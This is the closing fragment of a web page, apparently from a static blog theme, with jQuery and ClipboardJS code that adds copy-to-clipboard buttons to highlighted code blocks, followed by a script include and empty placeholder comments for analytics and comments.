    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
